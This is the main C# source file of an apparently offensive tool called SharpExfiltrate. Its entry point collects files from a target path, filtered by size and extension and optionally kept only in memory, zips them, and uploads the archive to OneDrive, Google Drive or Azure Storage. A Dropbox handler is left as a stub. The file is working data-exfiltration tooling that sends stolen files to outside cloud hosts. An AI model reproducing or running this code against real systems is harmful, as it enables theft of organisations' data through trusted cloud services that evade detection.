using CommandLine;
using SharpExfiltrate.Models;
using SharpExfiltrate.Modules;
using System;
using System.Threading.Tasks;

namespace SharpExfiltrate
{
    public class Program
    {


        public static async Task<int> DropBoxExfil(DropBoxOptions oneDriveOptions)
        {
            //More to come :)

            return 0;

        }

        public static async Task<int> GoogleDriveExfil(GoogleDriveOptions googleDriveOptions)
        {
            var fileHandlingModule = new FileHandling(googleDriveOptions.FilePath, googleDriveOptions.FileSize, googleDriveOptions.FileExtensions, googleDriveOptions.MemOnly);

            var oneDriveModule = new GoogleDrive(googleDriveOptions);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0)
            {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await oneDriveModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;

        }


        public static async Task<int> AzureStorageExfil(AzureStorageOptions azureStorageOptions)
        {
            var fileHandlingModule = new FileHandling(azureStorageOptions.FilePath, azureStorageOptions.FileSize, azureStorageOptions.FileExtensions, azureStorageOptions.MemOnly);

            var azureStorageModule = new AzureStorage(azureStorageOptions.ConnectionString);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0)
            {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await azureStorageModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;

        }

        public static async Task<int> OneDriveExfil(OneDriveOptions oneDriveOptions)
        {

            var fileHandlingModule = new FileHandling(oneDriveOptions.FilePath, oneDriveOptions.FileSize, oneDriveOptions.FileExtensions, oneDriveOptions.MemOnly);

            var oneDriveModule = new OneDrive(oneDriveOptions);

            var zipFileData = fileHandlingModule.PrepareZipFile();

            if (zipFileData.entryCount == 0) {
                Console.WriteLine("[+] No files compressed, check your size and extension filter!");
                return 0;
            }

            await oneDriveModule.UploadFile(zipFileData.zipStream, zipFileData.newFileName);

            return 0;
        }

        public static void Main(string[] args)
        {
            CommandLine.Parser.Default.ParseArguments<OneDriveOptions, GoogleDriveOptions, AzureStorageOptions>(args)
              .MapResult(
                (OneDriveOptions opts) => OneDriveExfil(opts).GetAwaiter().GetResult(),
              //  (DropBoxOptions opts) => DropBoxExfil(opts).GetAwaiter().GetResult(),
                (GoogleDriveOptions opts) => GoogleDriveExfil(opts).GetAwaiter().GetResult(),
                (AzureStorageOptions opts) => AzureStorageExfil(opts).GetAwaiter().GetResult(),
                errs => 1);
        }
    }
}
